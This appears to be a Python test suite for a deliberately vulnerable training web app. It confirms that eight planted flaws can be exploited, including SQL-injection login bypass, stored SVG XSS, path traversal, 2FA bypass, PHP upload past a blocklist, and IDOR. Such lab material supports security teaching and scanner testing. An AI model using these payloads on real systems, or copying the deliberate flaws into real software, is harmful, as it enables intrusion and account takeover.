"""
SecureHub VAPT Training Lab — Comprehensive Automated Verification Suite
Tests all 8 intentional vulnerabilities to ensure genuine exploitability
for Tracegate scanning, verification, and AI Fix validation.
"""

import os
import io
import sys
import unittest
from app import app, get_db
from reset_lab import reset_environment


class SecureHubVulnerabilityTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        # Reset lab to a pristine state before testing
        print("\n" + "=" * 70)
        print(" INITIALIZING SECUREHUB VAPT LAB AUTOMATED VERIFICATION SUITE")
        print("=" * 70)
        reset_environment()

    def setUp(self):
        self.app = app
        self.app.config["TESTING"] = True
        self.client = self.app.test_client()

    # ---------------------------------------------------------------------
    # VULN-001: Credential Caching & Form Autocomplete (CWE-524)
    # ---------------------------------------------------------------------
    def test_vuln_001_credential_caching_and_autocomplete(self):
        print("\n[*] Testing VULN-001: Credential Caching & Form Autocomplete (CWE-524)...")
        response = self.client.get("/login")
        self.assertEqual(response.status_code, 200)
        html = response.data.decode("utf-8")

        # Verify form or input contains autocomplete="on"
        has_form_autocomplete = 'autocomplete="on"' in html
        has_cache_control_no_store = "no-store" in response.headers.get("Cache-Control", "")

        print(f"    [+] Form contains autocomplete='on': {has_form_autocomplete}")
        print(f"    [+] Login endpoint lacks Cache-Control: no-store: {not has_cache_control_no_store}")

        self.assertTrue(has_form_autocomplete, "Form should explicitly enable autocomplete='on'")
        self.assertFalse(has_cache_control_no_store, "Login endpoint should lack Cache-Control: no-store")
        print("    [SUCCESS] VULN-001 Verified: Unsafe autocomplete and credential caching directives present.")

    # ---------------------------------------------------------------------
    # VULN-002: Username & Account Enumeration (CWE-204)
    # ---------------------------------------------------------------------
    def test_vuln_002_username_enumeration(self):
        print("\n[*] Testing VULN-002: Username & Account Enumeration (CWE-204)...")
        # 1. Valid user, wrong password
        resp_valid_user = self.client.post("/login", data={
            "username": "bob",
            "password": "wrong_password_xyz"
        }, follow_redirects=True)
        html_valid = resp_valid_user.data.decode("utf-8")

        # 2. Invalid user, wrong password
        resp_invalid_user = self.client.post("/login", data={
            "username": "non_existent_corporate_user_99",
            "password": "wrong_password_xyz"
        }, follow_redirects=True)
        html_invalid = resp_invalid_user.data.decode("utf-8")

        print(f"    [+] Response for valid user (bob): Contains 'Incorrect password for user.' -> {'Incorrect password for user.' in html_valid}")
        print(f"    [+] Response for invalid user: Contains 'Account with this username does not exist.' -> {'Account with this username does not exist.' in html_invalid}")

        self.assertIn("Incorrect password for user.", html_valid)
        self.assertIn("Account with this username does not exist.", html_invalid)
        self.assertNotEqual(html_valid, html_invalid, "Responses must be distinguishable for enumeration")
        print("    [SUCCESS] VULN-002 Verified: Observable difference allows user enumeration.")

    # ---------------------------------------------------------------------
    # VULN-003: Stored XSS via Malicious SVG Image Upload (CWE-79)
    # ---------------------------------------------------------------------
    def test_vuln_003_stored_svg_xss(self):
        print("\n[*] Testing VULN-003: Stored XSS via Malicious SVG Upload (CWE-79)...")
        # Log in as charlie
        self.client.post("/login", data={"username": "charlie", "password": "charlie123"}, follow_redirects=True)

        # SVG payload with active script
        svg_payload = (
            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
            '<circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" />'
            '<script>alert("TRACEGATE-XSS-VERIFIED")</script>'
            '</svg>'
        )

        data = {
            "file": (io.BytesIO(svg_payload.encode("utf-8")), "vector_xss.svg"),
            "description": "Security Audit Vector Test"
        }
        upload_resp = self.client.post("/upload", data=data, content_type="multipart/form-data", follow_redirects=True)
        self.assertEqual(upload_resp.status_code, 200)

        # View /uploads page
        gallery_resp = self.client.get("/uploads")
        self.assertEqual(gallery_resp.status_code, 200)
        gallery_html = gallery_resp.data.decode("utf-8")

        # Verify raw script tag is rendered unescaped in HTML
        rendered_unescaped = '<script>alert("TRACEGATE-XSS-VERIFIED")</script>' in gallery_html
        print(f"    [+] SVG <script> rendered raw and unescaped in /uploads: {rendered_unescaped}")
        self.assertTrue(rendered_unescaped, "SVG active script should be rendered unescaped in DOM")
        print("    [SUCCESS] VULN-003 Verified: Stored XSS via SVG rendered unescaped.")

    # ---------------------------------------------------------------------
    # VULN-004: Authentication Bypass via SQL Injection (CWE-287)
    # ---------------------------------------------------------------------
    def test_vuln_004_sql_injection_auth_bypass(self):
        print("\n[*] Testing VULN-004: Authentication Bypass via SQL Injection (CWE-287)...")
        # Attempt login as admin without valid password using SQL comment injection
        sqli_client = self.app.test_client()
        response = sqli_client.post("/login", data={
            "username": "admin' --",
            "password": "random_fake_password"
        }, follow_redirects=True)

        html = response.data.decode("utf-8")
        with sqli_client.session_transaction() as sess:
            logged_in_user = sess.get("username")
            logged_in_role = sess.get("role")

        print(f"    [+] Authenticated session username: {logged_in_user}")
        print(f"    [+] Authenticated session role: {logged_in_role}")

        self.assertEqual(logged_in_user, "admin")
        self.assertEqual(logged_in_role, "admin")
        self.assertIn("Welcome back", html)
        print("    [SUCCESS] VULN-004 Verified: SQL Injection successfully bypassed authentication as admin.")

    # ---------------------------------------------------------------------
    # VULN-005: 2FA Implementation Bypass (CWE-288)
    # ---------------------------------------------------------------------
    def test_vuln_005_2fa_implementation_bypass(self):
        print("\n[*] Testing VULN-005: 2FA Implementation Bypass (CWE-288)...")
        alice_client = self.app.test_client()
        # Alice has 2FA enabled
        login_resp = alice_client.post("/login", data={
            "username": "alice",
            "password": "alice123"
        })
        # Server redirects to /2fa
        self.assertEqual(login_resp.status_code, 302)
        self.assertIn("/2fa", login_resp.headers["Location"])

        # Check session: 2fa_verified is False
        with alice_client.session_transaction() as sess:
            self.assertFalse(sess.get("2fa_verified", True))
            self.assertTrue(sess.get("2fa_required", False))

        # Directly navigate to /dashboard without submitting 2FA token
        dash_resp = alice_client.get("/dashboard")
        dash_html = dash_resp.data.decode("utf-8")

        print(f"    [+] HTTP Status of direct /dashboard access without 2FA code: {dash_resp.status_code}")
        print(f"    [+] Protected Dashboard reached directly: {'Welcome back, Alice' in dash_html}")

        self.assertEqual(dash_resp.status_code, 200)
        self.assertIn("Welcome back, Alice", dash_html)
        print("    [SUCCESS] VULN-005 Verified: Server-side authorization failed to enforce 2FA verification.")

    # ---------------------------------------------------------------------
    # VULN-006: Path Traversal / Destination Storage Directory Escape (CWE-22)
    # ---------------------------------------------------------------------
    def test_vuln_006_path_traversal(self):
        print("\n[*] Testing VULN-006: Path Traversal / Storage Directory Escape (CWE-22)...")
        # Log in as bob
        self.client.post("/login", data={"username": "bob", "password": "bob123"}, follow_redirects=True)

        # Traverse out of uploads/ to lab_data/training_note.txt (test both ../ and ../../)
        for traversal_query in ["../lab_data/training_note.txt", "../../lab_data/training_note.txt"]:
            resp = self.client.get(f"/files/download?file={traversal_query}")
            self.assertEqual(resp.status_code, 200, f"Failed traversal for path: {traversal_query}")
            content = resp.data.decode("utf-8", errors="ignore")
            self.assertIn("TRACEGATE{path_traversal_lab_verified_cwe22}", content)
        print("    [SUCCESS] VULN-006 Verified: Directory traversal successfully escaped storage root.")

    # ---------------------------------------------------------------------
    # VULN-007: Arbitrary File Upload via Insufficient Validation (CWE-434)
    # ---------------------------------------------------------------------
    def test_vuln_007_arbitrary_file_upload(self):
        print("\n[*] Testing VULN-007: Arbitrary File Upload via Insufficient Validation (CWE-434)...")
        # Log in as charlie
        self.client.post("/login", data={"username": "charlie", "password": "charlie123"}, follow_redirects=True)

        # Upload a .php script file (blocked in secure systems, permitted by weak blocklist)
        php_payload = "<?php // Simulation file for arbitrary extension verification\necho 'Tracegate PHP Upload Test'; ?>"
        data = {
            "file": (io.BytesIO(php_payload.encode("utf-8")), "diagnostic_tool.php"),
            "description": "Server diagnostics simulation"
        }
        resp = self.client.post("/upload", data=data, content_type="multipart/form-data", follow_redirects=True)
        self.assertEqual(resp.status_code, 200)
        html = resp.data.decode("utf-8")

        print(f"    [+] Upload of .php extension accepted: {'diagnostic_tool.php' in html}")
        self.assertIn("diagnostic_tool.php", html, "Non-whitelisted .php file must be accepted and listed")

        # Also verify blocked extensions (e.g. .exe) are blocked by the weak blocklist
        exe_data = {
            "file": (io.BytesIO(b"MZ..."), "malicious.exe"),
            "description": "Executable"
        }
        exe_resp = self.client.post("/upload", data=exe_data, content_type="multipart/form-data", follow_redirects=True)
        exe_html = exe_resp.data.decode("utf-8")
        self.assertIn("prohibited", exe_html)
        print("    [+] Flawed blocklist verified: Prohibits .exe but erroneously allows .php, .svg, scripts")
        print("    [SUCCESS] VULN-007 Verified: Unrestricted extension validation permits arbitrary file types.")

    # ---------------------------------------------------------------------
    # VULN-008: Insecure Direct Object References (IDOR) on Profile (CWE-639)
    # ---------------------------------------------------------------------
    def test_vuln_008_idor_profile_update(self):
        print("\n[*] Testing VULN-008: IDOR / BOLA on Profile Update (CWE-639)...")
        # Log in as Alice (user_id = 1)
        self.client.post("/login", data={"username": "alice", "password": "alice123"}, follow_redirects=True)

        # Alice updates Bob's profile (user_id = 2) by tampering with the hidden user_id field
        tampered_data = {
            "user_id": "2",  # Target: Bob Brown
            "display_name": "Bob Brown (Modified By Alice IDOR)",
            "phone": "+1 (999) 888-7777",
            "address": "450 Corporate Row (Unauthorized Address Update)",
            "bio": "Unauthorized profile modification verified via CWE-639 demonstration."
        }
        update_resp = self.client.post("/profile/edit", data=tampered_data, follow_redirects=True)
        self.assertEqual(update_resp.status_code, 200)

        # Inspect Bob's public profile directly
        user2_resp = self.client.get("/user/2")
        user2_html = user2_resp.data.decode("utf-8")

        print(f"    [+] Bob's display name modified by Alice: {'Bob Brown (Modified By Alice IDOR)' in user2_html}")
        print(f"    [+] Bob's bio modified by Alice: {'Unauthorized profile modification verified' in user2_html}")

        self.assertIn("Bob Brown (Modified By Alice IDOR)", user2_html)
        self.assertIn("Unauthorized profile modification verified via CWE-639 demonstration.", user2_html)
        print("    [SUCCESS] VULN-008 Verified: IDOR vulnerability allowed unauthorized profile modification.")


if __name__ == "__main__":
    suite = unittest.TestLoader().loadTestsFromTestCase(SecureHubVulnerabilityTests)
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    if result.wasSuccessful():
        print("\n" + "=" * 70)
        print(" ALL 8 VULNERABILITIES VERIFIED SUCCESSFULLY!")
        print("=" * 70)
        sys.exit(0)
    else:
        print("\n[-] Some tests failed.")
        sys.exit(1)
